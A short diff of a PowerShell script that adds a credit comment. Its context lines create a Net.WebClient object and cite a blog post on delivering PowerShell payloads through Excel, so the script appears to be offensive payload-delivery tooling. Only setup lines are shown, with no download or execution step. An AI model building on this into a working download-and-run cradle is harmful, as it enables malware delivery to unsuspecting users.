@@ -1,3 +1,5 @@
+#Credit to @obscuresec and @mattifestation for this
+
 $Word = 'h4x0r'
 $WebClientObject = New-Object Net.WebClient
 $comment = "http://enigma0x3.wordpress.com/2014/01/15/new-feature-added-to-powershell-payload-excel-delivery/"
